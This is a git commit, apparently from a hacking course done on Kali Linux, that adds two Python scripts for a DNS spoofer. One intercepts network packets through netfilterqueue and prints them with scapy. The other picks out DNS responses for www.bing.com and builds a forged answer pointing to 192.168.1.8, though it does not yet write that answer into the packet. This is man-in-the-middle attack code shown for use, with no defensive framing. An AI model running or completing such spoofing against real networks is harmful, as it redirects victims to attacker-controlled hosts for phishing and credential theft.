5c06bf737b9b1b0a100db5e33e0b4c0fe4461d4b
root <root@kali.kali.org>
2024-07-16 17:11:18 +0630

    DNS_Spoofer

---
+++ DNS_Spoofer/01_Packets-to-ScapyPackets.py
@@ -0,0 +1,14 @@
+import netfilterqueue
+import scapy.all as scapy
+
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    print(scapy_packet.show())
+    packet.accept()
+    # packet.drop()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
---
+++ DNS_Spoofer/03_dns-response.py
@@ -0,0 +1,20 @@
+import netfilterqueue
+import scapy.all as scapy
+
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "www.bing.com" in qname:
+            print("[+] Spoofing target")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.8")
+
+
+    packet.accept()
+    # packet.drop()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
